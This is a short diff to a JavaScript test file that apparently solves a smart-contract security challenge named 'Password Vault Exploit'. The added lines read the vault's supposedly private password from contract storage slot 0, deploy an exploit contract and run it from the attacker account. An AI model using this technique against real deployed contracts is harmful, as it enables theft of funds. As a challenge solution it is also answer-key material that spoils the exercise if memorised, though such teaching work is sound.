@@ -24,6 +24,12 @@ describe('[PASSWORD VAULT EXPLOIT]', async function () {
     it('Exploit', async function () {
         // YOUR EXPLOIT HERE
 
+        let password = await attacker.provider.getStorageAt(this.vault.address, 0)
+        
+        let exploit = await (await ethers.getContractFactory('PasswordVaultExploit', deployer)).deploy(this.vault.address)
+        
+        await exploit.connect(attacker).run(password)
+        
     })
 
     after(async function () {
